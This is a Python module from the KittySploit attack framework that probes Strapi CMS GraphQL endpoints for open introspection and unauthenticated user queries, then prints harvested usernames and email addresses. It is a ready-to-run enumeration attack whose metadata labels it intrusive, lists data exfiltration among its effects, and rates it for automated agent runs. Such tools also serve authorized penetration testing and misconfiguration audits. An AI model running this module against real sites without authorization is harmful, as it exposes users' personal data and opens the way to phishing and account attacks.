#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Strapi GraphQL introspection and user enumeration."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.strapi_graphql_probe import enumerate_strapi_graphql


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Strapi GraphQL Abuse",
        "description": (
            "Probes Strapi GraphQL endpoints for open introspection and unauthenticated "
            "usersPermissionsUsers / users queries exposing emails."
        ),
        "author": ["KittySploit Team"],
        "tags": ["strapi", "graphql", "cms", "enumeration", "auxiliary"],
        "modules": [
            "auxiliary/scanner/http/strapi_users_enum",
            "auxiliary/scanner/http/graphql_abuse",
            "scanner/http/strapi_documentation_detect",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.2,
        },
    }

    graphql_path = OptString("/graphql", "Primary Strapi GraphQL path", False)

    def run(self):
        findings = enumerate_strapi_graphql(self.http_request)
        if not findings:
            custom = str(self.graphql_path or "").strip()
            if custom and custom != "/graphql":
                from lib.scanner.http.strapi_graphql_probe import (
                    probe_strapi_graphql_users,
                    probe_strapi_introspection,
                )

                intro = probe_strapi_introspection(self.http_request, custom)
                if intro:
                    findings.append(intro)
                users = probe_strapi_graphql_users(self.http_request, custom)
                if users:
                    findings.append(users)

        if not findings:
            print_error("No Strapi GraphQL introspection or user queries accessible")
            return False

        user_hits = [f for f in findings if f.get("kind") == "strapi_graphql_users"]
        for hit in user_hits:
            for u in hit.get("sample_users") or []:
                print_info(f"  → {u.get('username')} / {u.get('email')}")

        self.set_info(
            severity="critical" if user_hits else "high",
            reason=f"Strapi GraphQL: {len(findings)} accessible probe(s)",
            findings=findings,
        )
        return True
